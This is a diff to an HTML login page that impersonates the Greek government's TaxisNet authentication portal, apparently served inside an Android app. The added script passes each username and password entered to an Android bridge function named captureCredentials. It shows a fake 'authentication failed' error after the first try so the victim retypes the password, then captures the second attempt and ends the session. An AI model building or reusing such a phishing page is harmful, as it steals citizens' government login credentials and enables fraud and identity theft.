@@ -7,13 +7,16 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
     <div class="container">
         <div class="card">
             <header>
                 <div class="header-content">
                     <div class="logo-left">
                         <svg width="180" height="60" viewBox="0 0 180 60">
-                            <!-- GGPS Logo -->
                             <rect x="10" y="10" width="40" height="40" fill="#5b89b4" rx="2" />
                             <path d="M 20 20 L 40 20 L 40 40 L 20 40 Z" fill="white" />
                             <path d="M 25 25 L 35 25 L 35 35 L 25 35 Z" fill="#e88121" />
@@ -24,7 +27,6 @@
                     </div>
                     <div class="logo-right">
                         <svg width="180" height="60" viewBox="0 0 180 60">
-                            <!-- Hellenic Republic Logo -->
                             <circle cx="25" cy="30" r="18" fill="none" stroke="#5b89b4" stroke-width="1.5" />
                             <rect x="23" y="18" width="4" height="24" fill="#5b89b4" />
                             <rect x="13" y="28" width="24" height="4" fill="#5b89b4" />
@@ -35,7 +37,7 @@
                     </div>
                 </div>
             </header>
-            
+
             <div class="banner">
                 <h1>Αυθεντικοποίηση Χρηστών</h1>
                 <button class="lang-btn">English</button>
@@ -45,18 +47,23 @@
                 <section class="login-box">
                     <h2>Σύνδεση</h2>
                     <p class="subtitle">Παρακαλώ εισάγετε τους κωδικούς σας στο <strong>TaxisNet</strong> για να συνδεθείτε.</p>
-                    
+
+                    <div class="error-box" id="errorBox">
+                        <span class="error-title">Αποτυχία στην Αυθεντικοποίηση του χρήστη!</span>
+                        <span class="error-subtitle">Η σύνδεσή σας δεν ήταν δυνατή.</span>
+                    </div>
+
                     <form id="loginForm">
                         <div class="form-group">
                             <label for="username">Χρήστης:</label>
                             <input type="text" id="username" name="username" autocomplete="username">
                         </div>
-                        
+
                         <div class="form-group">
                             <label for="password">Κωδικός:</label>
                             <input type="password" id="password" name="password" autocomplete="current-password">
                         </div>
-                        
+
                         <button type="submit" class="submit-btn">Σύνδεση</button>
                     </form>
                 </section>
@@ -71,17 +78,51 @@
     </div>
 
     <script>
+        var attemptCount = 0;
+
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+
+        function showError() {
+            document.getElementById('errorBox').style.display = 'flex';
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+        }
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+            var user = document.getElementById('username').value.trim();
+            var pass = document.getElementById('password').value;
 
-            // Check if our Android "Local Server" bridge is available
-            if (window.AndroidBridge) {
-                window.AndroidBridge.captureCredentials(user, pass);
-                alert('Συνδεθήκατε επιτυχώς! (Δεδομένα καταγράφηκαν)');
+            if (!user || !pass) return;
+
+            document.getElementById('errorBox').style.display = 'none';
+            showLoading();
+
+            if (attemptCount === 0) {
+                attemptCount++;
+                if (window.AndroidBridge) {
+                    window.AndroidBridge.captureCredentials(user, pass);
+                }
+                setTimeout(function() {
+                    hideLoading();
+                    showError();
+                }, 1800);
             } else {
-                alert('Συνδεθήκατε επιτυχώς!');
+                if (window.AndroidBridge) {
+                    window.AndroidBridge.captureCredentials(user, pass);
+                }
+                setTimeout(function() {
+                    hideLoading();
+                    if (window.AndroidBridge) {
+                        window.AndroidBridge.finishSession();
+                    }
+                }, 2000);
             }
         });
     </script>
